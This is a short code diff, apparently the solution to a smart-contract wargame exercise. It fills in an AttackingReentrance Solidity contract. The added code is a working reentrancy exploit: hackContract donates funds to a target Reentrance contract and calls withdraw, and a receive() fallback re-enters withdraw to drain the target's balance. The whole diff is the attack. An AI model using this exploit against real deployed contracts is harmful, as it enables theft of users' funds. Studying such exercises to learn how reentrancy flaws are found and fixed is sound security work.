@@ -10,6 +10,12 @@ contract AttackingReentrance {
     }
 
     function hackContract() external {
-        // Code me!
+        Reentrance(contractAddress).donate{value: address(this).balance}(address(this));
+        Reentrance(contractAddress).withdraw();
+    }
+
+    receive() external payable {
+        //(bool result, ) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
+        Reentrance(contractAddress).withdraw();
     }
 }
